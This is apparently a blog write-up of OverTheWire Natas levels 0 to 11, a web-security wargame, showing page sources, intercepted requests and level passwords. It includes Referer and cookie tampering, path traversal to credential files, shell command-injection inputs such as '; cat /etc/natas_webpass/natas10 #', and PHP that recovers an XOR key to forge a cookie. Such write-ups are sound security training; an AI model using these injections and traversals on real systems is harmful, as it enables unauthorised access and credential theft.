---
title: Overthewire - Natas
# author: Grace JyL
date: 2020-02-20 11:11:11 -0400
description:
excerpt_separator:
categories: [Lab, Overthewire]
tags: [Lab, Overthewire, SSH]
math: true
# pin: true
toc: true
# image: /assets/img/sample/devices-mockup.png
---

# Overthewire - Natas

Overthewire_Natas

[toc]

---

Natas teaches the basics of server side web-security.
- [Overthewire_Natas](https://overthewire.org/wargames/natas/)
- Each level of natas consists of its own website located at `http://natasX.natas.labs.overthewire.org`, where X is the level number.
- There is no SSH login.
- To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

- many websites such as Facebook, Google, and even Amazon, store information in SQL Databases. These databases are connected to the web servers, allowing them to process user transactions, login requests, and a countless amount of other things!
- These servers also handle user encryption, session keys, etc. One coding mistake; allowing a malicious attacker to inject SQL code into a query, or even inject special characters into a form, or the URL, can be devastating!

---

## Natas Level 0

Start here:
- Username: natas0
- Password: natas0
- URL:      http://natas0.natas.labs.overthewire.org

Right Click > View Page Source.

```
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
</body>
```

---

## Natas Level 0 → Level 1
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

- can’t use Right Click
- bring up the `developer window` > sources > index

| 访问 DevTools                       | 在 Windows 上         | 在 Mac 上       |
| ----------------------------------- | --------------------- | --------------- |
| 打开 Developer Tools                | F12、Ctrl + Shift + I | Cmd + Opt + I   |
| 打开/切换检查元素模式和浏览器窗口   | Ctrl + Shift + C      | Cmd + Shift + C |
| 打开 Developer Tools 并聚焦到控制台 | Ctrl + Shift + J      | Cmd + Opt + J   |
| 检查检查器（取消停靠第一个后按）    | Ctrl + Shift + I      | Cmd + Opt + I   |

```html
<html>

<head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas1", "pass": "gtVrDuiDfck831PqWsLEZy5gyDz1clto" };</script>
</head>

<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
  <h1>natas1</h1>
  <div id="content">
  You can find the password for the
  next level on this page, but rightclicking has been blocked!
  <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
  </div>
</body>

</html>
```

---

## Natas Level 1 → Level 2 `add /files to the end of the URL.`
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

```html
-------------------------------------------------------------------
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img alt="pic" src="files/pixel.png">      # a image file linked in the HTML code.
</div>
</body>
-------------------------------------------------------------------
add /files to the end of the URL.
http://natas2.natas.labs.overthewire.org/files/. see a page displayed;

Index of /files
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-
[IMG]	pixel.png	2016-12-15 16:07	303
[TXT]	users.txt	2016-12-20 05:15	145
-------------------------------------------------------------------
open in new Windows
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
-------------------------------------------------------------------
```
---

## Natas Level 2 → Level 3 `http://natas3.natas.labs.overthewire.org/robots.txt`
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

```html
-------------------------------------------------------------------
# Page Source
<body>
  <h1>natas3</h1>
  <div id="content">
  There is nothing on this page
  <!-- No more information leaks!! Not even Google will find it this time... -->
  </div>
</body>

# “Not even Google will find it this time…” is hint.
# it’s referring to robots.txt.

http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/

# so the robots.txt is disallowing crawlers to find /s3cr3t/.
http://natas3.natas.labs.overthewire.org/s3cr3t/.
Index of /s3cr3t
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-
[TXT]	users.txt	2016-12-20 05:15	40

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

---

## Natas Level 3 → Level 4 `use brup to intercept request, update Referer url.`

> Solution: intercept the packet, change the referrer url

Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

- “HTTP Referrer”.
    - set up firefox and brup
    - making sure proxy is set up for localhost @ 127.0.0.1.
        - Brup:
        - Proxy > Option >
    - set up Firefox network settings
        - allow Firefox to localhost proxy.
        - Menu > Preferences > Advanced > Network > Connection Settings > `Manual proxy configuration: HTTP Proxy: 127.0.0.1 Port:8080`

```html
"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""
--------------------------------------------------------
goto http://natas4.natas.labs.overthewire.org/
press Refresh page
--------------------------------------------------------
brup > proxy > intercept > Raw:

GET / HTTP/1.1
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
# add this line
Referer: http://natas5.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
--------------------------------------------------------

"Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
```

Note: Once done, go back to Network Settings and select “Use System Proxy Settings” so you can have a normal connection, without it routing through Burp.

---

## Natas Level 4 → Level 5

> Solution: intercept the packet, change the cookie

Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

```html
# refresh the Page
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
Connection: close
Cookie: loggedin=0
Upgrade-Insecure-Requests: 1
--------------------------------------------------------
# the packet header stores cookie information.
# change loggedin=0 to loggedin=1, and Forward that packet.
--------------------------------------------------------
"Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
```

---

## Natas Level 5 → Level 6

> Solution: source code

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

```html
--------------------------------------------------------
<body>
<h1>natas6</h1>
<div id="content">

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  #!!!!!!!
</div>
</body>
--------------------------------------------------------
goto:
http://natas6.natas.labs.overthewire.org/index-source.html
--------------------------------------------------------
include "includes/secret.inc";
# the PHP is including a link to a file stored on the webpage /includes/secret.inc.
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
--------------------------------------------------------
goto:
http://natas6.natas.labs.overthewire.org/includes/secret.inc
--------------------------------------------------------
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
--------------------------------------------------------
"Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
```

---

## Natas Level 6 → Level 7

> Solution: intercept the packet, change the cookie

Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>

<body>
  <h1>natas7</h1>
  <div id="content">
  <a href="index.php?page=home">Home</a>
  <a href="index.php?page=about">About</a>
  <br>
  <br>
  this is the front page
  <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
  </div>
</body>
</html>
--------------------------------------------------------
we can get the password from "etc/natas_webpass/natas8"
assume this is a Directory Traversal Attack.
--------------------------------------------------------
Home: http://natas7.natas.labs.overthewire.org/index.php?page=home
remove home and add "/etc/natas_webpass/natas8".
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
--------------------------------------------------------
Home About
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

---

## Natas Level 7 → Level 8

> Solution: decode the base64

Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

```html
--------------------------------------------------------
View "sourcecode"
--------------------------------------------------------
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>

<body>
<h1>natas8</h1>
<div id="content">
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
...
--------------------------------------------------------
# the secret code we need is encoded.
the “secret” entered is converted from "bin" to "hex", reversed, and then "base64 encoded".
return bin2hex(strrev(base64_encode($secret)))
"3d3d516343746d4d6d6c315669563362"

to reverse engineer this.
opening the console, start up PHP with "php -a".
--------------------------------------------------------
$ php -a
php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
oubWYf2kBq
--------------------------------------------------------
get the secret key oubWYf2kBq.
got the password W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

---

## Natas Level 8 → Level 9

> Solution: decode the base64

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

```html
Find words containing:
Output:
--------------------------------------------------------
sourcecode:
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
--------------------------------------------------------
# type in the word “password”
# then the passthru command in the PHP script:
grep -i password dictionary.txt.
# key is encapsulated in quotes, no input filtering, able to enter special characters.
--------------------------------------------------------
use the ";" command separator to use 2 commands in one line.
use the "#" command, comment out the rest of the text following the symbol.

in the input field type
"; cat /etc/natas_webpass/natas10 #"
in turn will run the passthru command as such;
"grep -i ; cat /etc/natas_webpass/natas10 #, commenting out and removing dictionary.txt."
--------------------------------------------------------
Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
--------------------------------------------------------
```

---

## Natas Level 9 → Level 10

> Solution: decode the base64

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

```html
For security reasons, we now filter on certain characters
Find words containing:
Output:
--------------------------------------------------------
Output:
<pre>
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/ [;|&] /',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
--------------------------------------------------------
# now they are filtering the ; and & command.
but they still haven’t fixed the way “key” is storing input.
exploit this the same way we did in 9;
but this time just using regular expressions.

enter ".* /etc/natas_webpass/natas11 #"
".*" : tell grep to search for all, while ignoring case, and match it to etc/natas_webpass/natas11.
"#" : comments out dictionary.txt, preventing any errors from occurring.

grep -i .* /etc/natas_webpass/natas11 # dictionary.txt
--------------------------------------------------------
Output:
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

---

## Natas Level 10 → Level 11
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK


```html
--------------------------------------------------------
Cookies are protected with XOR encryption
Background color:
#ffffff
--------------------------------------------------------
<!-- use burpsuite, got cookie -->
GET /?bgcolor=%23ffffff HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Authorization: Basic bmF0YXMxMTpVODJxNVRDTU1ROXh1Rm9JM2RZWDYxczdPWkQ5SktvSw==
Connection: close
Referer: http://natas11.natas.labs.overthewire.org/?bgcolor=%23ffffff
Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
Upgrade-Insecure-Requests: 1

Cookie = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
--------------------------------------------------------
<?
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

--------------------------------------------------------
XOR Cipher
A XOR B = C.
Original_Data XOR KEY = Encrypted_Data
Original_Data XOR Encrypted_Data = KEY


DefaultData XOR cookie = KEY
correctData XOR KEY = cookieAnswer
--------------------------------------------------------
fire up PHP and write the following script to reverse engineer the key.
<?
function xor_encrypt($text) {
    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
print xor_encrypt(json_encode($data));
?>
--------------------------------------------------------
will get the Key Output
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq.
--------------------------------------------------------
replace the $key with our newly found key, edit the showpassword to yes.

<?
function xor_encrypt($text) {
    $key = 'qw8J';
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
print base64_encode(xor_encrypt(json_encode($data)));
?>
--------------------------------------------------------
Once run the new PHP script
Original_Data XOR KEY = Encrypted_Data

cookie: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
--------------------------------------------------------
Burp and submit
password EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
--------------------------------------------------------
```












.
